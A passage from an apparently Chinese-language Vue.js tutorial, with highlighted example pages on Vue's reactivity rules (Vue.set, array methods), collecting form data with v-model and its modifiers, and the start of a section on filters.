class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>名字：&#123;&#123;student.name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-if</span>=<span class="string">&quot;student.sex&quot;</span>&gt;</span>性别：&#123;&#123;student.sex&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>年龄：真实&#123;&#123;student.age.rAge&#125;&#125;,对外&#123;&#123;student.age.sAge&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>爱好：<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(h,index) in student.hobby&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">&#123;&#123;h&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>朋友们：<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(friend,index) in student.friends&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">&#123;&#123;friend.name&#125;&#125;-&#123;&#123;friend.age&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line"><span class="javascript">address:<span class="string">&#x27;北京&#x27;</span>,</span></span><br><span class="line">student:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;小明&#x27;</span>,</span></span><br><span class="line">age:&#123;</span><br><span class="line">rAge:32,</span><br><span class="line">sAge:20,</span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript">hobby:[<span class="string">&#x27;抽烟&#x27;</span>,<span class="string">&#x27;喝酒&#x27;</span>,<span class="string">&#x27;烫头&#x27;</span>],</span></span><br><span class="line">friends:[</span><br><span class="line"><span class="javascript">&#123;<span class="attr">name</span>:<span class="string">&#x27;Jack&#x27;</span>,<span class="attr">age</span>:<span class="number">25</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">name</span>:<span class="string">&#x27;Tom&#x27;</span>,<span class="attr">age</span>:<span class="number">28</span>&#125;,</span></span><br><span class="line">],</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">methods: &#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">addSex</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="comment">// Vue.set(this.student,&#x27;sex&#x27;,&#x27;男&#x27;)</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.$set(<span class="built_in">this</span>.student,<span class="string">&#x27;sex&#x27;</span>,<span class="string">&#x27;男&#x27;</span>)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="30-总结Vue数据监测"><a href="#30-总结Vue数据监测" class="headerlink" title="30.总结Vue数据监测"></a>30.总结Vue数据监测</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>总结Vue数据监测<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">Vue监视数据的原理：</span></span><br><span class="line"><span class="comment">1.Vue会监视data中所有层次的数据；</span></span><br><span class="line"><span class="comment">2.如何监测对象中的数据？</span></span><br><span class="line"><span class="comment">通过setter实现监测，且要在new Vue时就传入要监测的数据。</span></span><br><span class="line"><span class="comment">(1).对象中后追加的属性，Vue默认不做响应式处理；</span></span><br><span class="line"><span class="comment">(2).如需给后追加的属性做响应，需使用如下API：</span></span><br><span class="line"><span class="comment">Vue.set(target,propertyName/index,value)或</span></span><br><span class="line"><span class="comment">vm.$set(target,propertyName/index,value)</span></span><br><span class="line"><span class="comment">3.如何监测数组中的数据？</span></span><br><span class="line"><span class="comment">通过包裹数组更新元素的方法实现，本质就是做了两件事。</span></span><br><span class="line"><span class="comment">(1).调用原生对应的方法对数组进行更新；</span></span><br><span class="line"><span class="comment">(2).重新解析模板，进而更新页面；</span></span><br><span class="line"><span class="comment">4.在Vue修改数组的某个元素，一定要使用如下方法：</span></span><br><span class="line"><span class="comment">(1).使用这些API：push()、pop()、shift()、unshift()、splice()、sort()、reverse();</span></span><br><span class="line"><span class="comment">(2).Vue.set() 或 vm.$set;</span></span><br><span class="line"><span class="comment">5.特别注意：Vue.set() 或 vm.$set 不能给vm 或 vm的根数据对象 添加属性；</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>学生信息<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;student.age++&quot;</span>&gt;</span>年龄+1岁<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addSex&quot;</span>&gt;</span>添加性别属性，默认值男<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;student.sex = &#x27;未知&#x27; &quot;</span>&gt;</span>修改性别<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addFriend&quot;</span>&gt;</span>在列表首位添加一个朋友<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;updateFirstFriendName&quot;</span>&gt;</span>修改第一个朋友的名字为张三<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addHobby&quot;</span>&gt;</span>添加一个爱好<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;updateHobby&quot;</span>&gt;</span>修改第一个爱好为开车<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;removeSmoke&quot;</span>&gt;</span>过滤掉爱好中的抽烟<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>名字：&#123;&#123;student.name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>年龄：&#123;&#123;student.age&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-if</span>=<span class="string">&quot;student.sex&quot;</span>&gt;</span>性别：&#123;&#123;student.sex&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>爱好：<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(h,index) in student.hobby&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">&#123;&#123;h&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>朋友们：<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(friend,index) in student.friends&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">&#123;&#123;friend.name&#125;&#125;-&#123;&#123;friend.age&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line">student:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;小明&#x27;</span>,</span></span><br><span class="line">age:18,</span><br><span class="line"><span class="javascript">hobby:[<span class="string">&#x27;抽烟&#x27;</span>,<span class="string">&#x27;喝酒&#x27;</span>,<span class="string">&#x27;烫头&#x27;</span>],</span></span><br><span class="line">friends:[</span><br><span class="line"><span class="javascript">&#123;<span class="attr">name</span>:<span class="string">&#x27;Jack&#x27;</span>,<span class="attr">age</span>:<span class="number">25</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">name</span>:<span class="string">&#x27;Tom&#x27;</span>,<span class="attr">age</span>:<span class="number">28</span>&#125;,</span></span><br><span class="line">],</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">methods: &#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">addSex</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="comment">// Vue.set(this.student,&#x27;sex&#x27;,&#x27;男&#x27;)</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.$set(<span class="built_in">this</span>.student,<span class="string">&#x27;sex&#x27;</span>,<span class="string">&#x27;男&#x27;</span>)</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">addFriend</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.student.friends.unshift(&#123;<span class="attr">name</span>:<span class="string">&#x27;小华&#x27;</span>,<span class="attr">age</span>:<span class="number">27</span>&#125;)</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">updateFirstFriendName</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.student.friends[<span class="number">0</span>].name = <span class="string">&#x27;张三&#x27;</span></span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">addHobby</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.student.hobby.push(<span class="string">&#x27;学习&#x27;</span>)</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">updateHobby</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="comment">// this.student.hobby.splice(0,1,&#x27;开车&#x27;)</span></span></span><br><span class="line"><span class="javascript"><span class="comment">// this.$set(this.student.hobby,0,&#x27;开车&#x27;)</span></span></span><br><span class="line"><span class="javascript">Vue.set(<span class="built_in">this</span>.student.hobby,<span class="number">0</span>,<span class="string">&#x27;开车&#x27;</span>)</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">removeSmoke</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.student.hobby = <span class="built_in">this</span>.student.hobby.filter(<span class="function">(<span class="params">h</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> h !== <span class="string">&#x27;抽烟&#x27;</span></span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="31-收集表单数据"><a href="#31-收集表单数据" class="headerlink" title="31.收集表单数据"></a>31.收集表单数据</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>收集表单数据<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">            收集表单数据：</span></span><br><span class="line"><span class="comment">                若：&lt;input type=&quot;text&quot;&gt;，则v-model收集的是value值，用户输入的也是value值。</span></span><br><span class="line"><span class="comment">                若：&lt;input type=&quot;radio&quot;&gt;，则v-model收集的是value值，且要给标签配置value值。</span></span><br><span class="line"><span class="comment">                若：&lt;input type=&quot;checkbox&quot;&gt;</span></span><br><span class="line"><span class="comment">                    1.没有配置input的value属性，那么v-model收集的是checked值（勾选 或 未勾选，是布尔值）</span></span><br><span class="line"><span class="comment">                    2.配置input的value属性：</span></span><br><span class="line"><span class="comment">                        (1).v-model的初始值是非数组，那么v-model收集的是checked值（勾选 或 未勾选，是布尔值）</span></span><br><span class="line"><span class="comment">                        (2).v-model的初始值是数组，那么v-model收集的就是value组成的数组</span></span><br><span class="line"><span class="comment">                备注，v-model的三个修饰符：</span></span><br><span class="line"><span class="comment">                    lazy：失去焦点在收集数据</span></span><br><span class="line"><span class="comment">                    number：输入字符串转为有效的数字</span></span><br><span class="line"><span class="comment">                    trim：输入的首尾空格过滤</span></span><br><span class="line"><span class="comment">         --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--准备一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> @<span class="attr">submit.prevent</span>=<span class="string">&quot;demo&quot;</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- &lt;label for=&quot;account&quot;&gt;账号：&lt;/label&gt;</span></span><br><span class="line"><span class="comment">                &lt;input type=&quot;text&quot; id=&quot;account&quot;&gt;&lt;br&gt;&lt;br&gt;</span></span><br><span class="line"><span class="comment">                &lt;label for=&quot;password&quot;&gt;密码：&lt;/label&gt;</span></span><br><span class="line"><span class="comment">                &lt;input type=&quot;password&quot; id=&quot;password&quot;&gt; --&gt;</span></span><br><span class="line"></span><br><span class="line">                账号：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model.trim</span>=<span class="string">&quot;account&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                年龄：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">v-model.number</span>=<span class="string">&quot;age&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                性别：</span><br><span class="line">                男：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;男&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;sex&quot;</span>&gt;</span></span><br><span class="line">                女：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;女&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;sex&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                爱好：</span><br><span class="line">                学习<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;study&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span></span><br><span class="line">                打游戏<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;game&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span></span><br><span class="line">                吃饭<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;eat&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                所在校区：<span class="tag">&lt;<span class="name">select</span> <span class="attr">v-model</span>=<span class="string">&quot;city&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span>请选择校区<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;beijing&quot;</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;shanghai&quot;</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;chengdu&quot;</span>&gt;</span>成都<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;shenzhen&quot;</span>&gt;</span>深圳<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;wuhan&quot;</span>&gt;</span>武汉<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                其他信息：</span><br><span class="line">                <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">v-model.lazy</span>=<span class="string">&quot;other&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;agree&quot;</span>&gt;</span> 阅读并接受<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>《用户协议》<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">       <span class="keyword">const</span> vm =  <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">            el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">account:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                password:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                age:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                sex:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line">                hobby:[],</span><br><span class="line"><span class="javascript">                city:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                other:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                agree:<span class="string">&#x27;&#x27;</span></span></span><br><span class="line">&#125;,</span><br><span class="line">            methods: &#123;</span><br><span class="line"><span class="javascript">                <span class="function"><span class="title">demo</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="comment">// alert(this.account+&#x27; : &#x27;+this.password+&#x27; : &#x27;+this.sex+&#x27; : &#x27;+this.hobby</span></span></span><br><span class="line"><span class="javascript">                    <span class="comment">// +&#x27; : &#x27;+this.city+&#x27; : &#x27;+this.other+&#x27; : &#x27;+this.agree)</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">                    <span class="comment">// console.log(this.account+&#x27; : &#x27;+this.password+&#x27; : &#x27;+this.sex+&#x27; : &#x27;+this.hobby</span></span></span><br><span class="line"><span class="javascript">                    <span class="comment">// +&#x27; : &#x27;+this.city+&#x27; : &#x27;+this.other+&#x27; : &#x27;+this.agree)</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">                    <span class="comment">//将收集到的数据转为json格式输出</span></span></span><br><span class="line"><span class="javascript">                    <span class="built_in">console</span>.log(<span class="built_in">JSON</span>.stringify(<span class="built_in">this</span>._data))</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="32-过滤器"><a href="#32-过滤器" class="headerlink" title="32.过滤器"></a>32.过滤器</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>过滤器<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/dayjs.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">        过滤器：</span></span><br><span class="line"><span class="comment">            定义：对要显示的数据进行一些特定格式处理后在显示（适用于一些简单逻辑处理）。</span></span><br><span class="line"><span class="comment">            语法：</span></span><br><span class="line"><span class="comment">                1.注册过滤器： Vue.filter(name，callback) 或 new Vue(&#123;filters:&#123;&#125;&#125;)</span></span><br><span class="line"><span class="comment">                2.使用过滤器：&#123;&#123;xxx | 过滤器名&#125;&#125; 或 v-bind:属性=&quot;xxx | 过滤器名&quot;</span></span><br><span class="line"><span class="comment">            备注：</span></span><br><span class="line"><span class="comment">                1.过滤器也可以接收额外参数，多个过滤器也可以串联</span></span><br><span class="line"><span class="comment">                2.并没有改变原本的数据，只产生新的对应的数据</span></span><br><span class="line"><span class="comment">     --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span 